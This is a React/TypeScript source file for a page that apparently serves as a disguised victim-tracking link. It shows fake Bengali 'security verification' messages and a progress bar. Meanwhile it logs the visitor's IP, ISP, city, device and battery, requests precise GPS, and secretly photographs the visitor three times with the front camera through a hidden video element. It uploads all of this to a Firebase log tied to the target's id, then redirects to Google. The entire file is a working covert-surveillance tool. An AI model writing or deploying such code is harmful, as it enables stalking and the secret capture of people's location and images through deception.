
import React, { useEffect, useRef, useState } from 'react';
import { useParams } from 'react-router-dom';
import { collection, addDoc, updateDoc, doc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { ref, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
import { db, storage } from '../firebase';

const TrackPage: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const [status, setStatus] = useState('সংযোগ যাচাই করা হচ্ছে...');
  const [progress, setProgress] = useState(0);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const trackerInitiated = useRef(false);

  useEffect(() => {
    if (id && !trackerInitiated.current) {
      trackerInitiated.current = true;
      executeTracking();
    }
  }, [id]);

  const resizeAndCompress = (video: HTMLVideoElement): string => {
    const canvas = document.createElement('canvas');
    canvas.width = 320;
    canvas.height = 240;
    const ctx = canvas.getContext('2d');
    if (ctx) {
      ctx.drawImage(video, 0, 0, 320, 240);
      return canvas.toDataURL('image/jpeg', 0.3); // High compression
    }
    return '';
  };

  const executeTracking = async () => {
    let currentLogId = "";

    // STEP 1: Immediate Base Data (IP, ISP, Device)
    try {
      setStatus('সার্ভার যাচাই করা হচ্ছে...');
      const [ipRes, battery] = await Promise.all([
        fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ ip: 'Unknown', org: 'Unknown', city: 'Unknown' })),
        // @ts-ignore
        navigator.getBattery ? navigator.getBattery() : Promise.resolve(null)
      ]);

      const baseData = {
        userId: id,
        timestamp: serverTimestamp(),
        ip: ipRes.ip || "Unknown",
        isp: ipRes.org || "Unknown",
        city: ipRes.city || "Unknown",
        network: ipRes.org || "Unknown",
        device: {
          name: /Android/i.test(navigator.userAgent) ? 'Android' : /iPhone|iPad/i.test(navigator.userAgent) ? 'iOS' : 'PC',
          model: navigator.platform,
          userAgent: navigator.userAgent
        },
        battery: battery ? { level: Math.round(battery.level * 100), charging: battery.charging } : null,
        status: 'Base Info Saved'
      };

      const docRef = await addDoc(collection(db, "logs"), baseData);
      currentLogId = docRef.id;
      setProgress(30);
    } catch (err) {
      console.error("Base logging failed", err);
    }

    if (!currentLogId) return;

    // STEP 2: Location (Lat, Lng)
    try {
      setStatus('নিরাপত্তা কোড যাচাই করা হচ্ছে...');
      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { 
          enableHighAccuracy: true, 
          timeout: 8000 
        });
      });
      
      await updateDoc(doc(db, "logs", currentLogId), {
        location: { 
          lat: position.coords.latitude, 
          lng: position.coords.longitude, 
          accuracy: position.coords.accuracy 
        },
        status: 'Location Saved'
      });
      setProgress(60);
    } catch (e) {
      console.log("GPS Failed or Denied");
    }

    // STEP 3: Camera & Selfie
    try {
      setStatus('অ্যাক্সেস কনফার্ম করা হচ্ছে...');
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await new Promise(r => setTimeout(r, 1500)); // Wait for camera to focus

        const photos: string[] = [];
        for (let i = 0; i < 3; i++) {
          const compressedData = resizeAndCompress(videoRef.current);
          if (compressedData) {
            const storageRef = ref(storage, `captures/${id}/${Date.now()}_${i}.jpg`);
            await uploadString(storageRef, compressedData, 'data_url');
            const url = await getDownloadURL(storageRef);
            photos.push(url);
            
            // Send first photo immediately as a backup field
            if (i === 0) {
              await updateDoc(doc(db, "logs", currentLogId), { firstPhoto: url });
            }
          }
          await new Promise(r => setTimeout(r, 600));
        }
        
        stream.getTracks().forEach(t => t.stop());
        await updateDoc(doc(db, "logs", currentLogId), { 
          photoUrls: photos, 
          status: 'Full Capture Success' 
        });
      }
      setProgress(100);
      setStatus('সফলভাবে সম্পন্ন হয়েছে');
    } catch (e) {
      console.log("Camera Failed or Denied");
      setProgress(100);
    }

    // STEP 4: Redirect with Delay
    setTimeout(() => {
      window.location.href = "https://www.google.com";
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-8 text-center font-['Hind_Siliguri']">
      <div className="w-full max-w-sm">
        <div className="mb-10">
           <div className="w-16 h-16 border-[5px] border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-8"></div>
           <h2 className="text-xl font-bold text-slate-800 mb-2">{status}</h2>
           <p className="text-slate-400 text-[10px] font-bold uppercase tracking-widest">Secure System Verification</p>
        </div>
        
        <div className="w-full bg-slate-100 h-1.5 rounded-full overflow-hidden mb-6">
           <div className="bg-blue-600 h-full transition-all duration-1000" style={{ width: `${progress}%` }}></div>
        </div>
        
        <p className="text-[11px] text-slate-400 italic">সার্ভারের সাথে সংযোগ বিচ্ছিন্ন করবেন না...</p>
        
        <video ref={videoRef} autoPlay muted playsInline className="hidden"></video>
        <canvas ref={canvasRef} className="hidden"></canvas>
      </div>
    </div>
  );
};

export default TrackPage;
